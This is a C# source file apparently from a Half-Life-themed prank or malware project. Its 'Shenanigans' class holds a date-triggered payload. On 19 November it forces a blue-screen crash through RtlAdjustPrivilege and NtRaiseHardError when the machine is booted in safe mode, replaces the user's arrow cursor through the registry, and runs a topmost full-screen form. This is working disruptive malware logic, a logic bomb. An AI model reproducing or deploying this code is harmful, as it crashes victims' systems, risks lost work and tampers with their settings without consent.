using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

namespace Project.Classes
{
    public class Shenanigans
    {
        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private const UInt32 SWP_NOSIZE = 0x0001;
        private const UInt32 SWP_NOMOVE = 0x0002;
        private const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;

        public static void SetWindowTopMost(Form form)
        {
            Unmanaged.SetWindowPos(form.Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
        }
        public static void TriggerBSOD()
        {
            Unmanaged.RtlAdjustPrivilege(19, true, false, out bool previousValue);
            Unmanaged.NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        const int VK_LBUTTON = 0x01;
        const int VK_RBUTTON = 0x02;

        static bool IsKeyPressed(int vKey)
        {
            short state = Unmanaged.GetAsyncKeyState(vKey);

            return (state & 0x8000) != 0;
        }

        const int SPI_SETCURSORS = 0x0057;
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;
        
        private static void ChangeCursor()
        {
            string temporary = Path.GetRandomFileName() + ".cur";
            File.WriteAllBytes(temporary, Properties.Resources.crowbar);
            Registry.SetValue(@"HKEY_CURRENT_USER\Control Panel\Cursors\", "Arrow", temporary);
            Unmanaged.SystemParametersInfo(SPI_SETCURSORS, 0, null, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        internal const int SM_CLEANBOOT = 67;

        public static void Action()
        {
            DateTime dt = DateTime.Today;
            if (dt.Day == 19 && dt.Month == 11)
            {
                if (Unmanaged.GetSystemMetrics(SM_CLEANBOOT) > 0) {
                    TriggerBSOD();
                }

                ChangeCursor();

                Application.Run(new Forms.blackMesa());
            }
        }
    }
}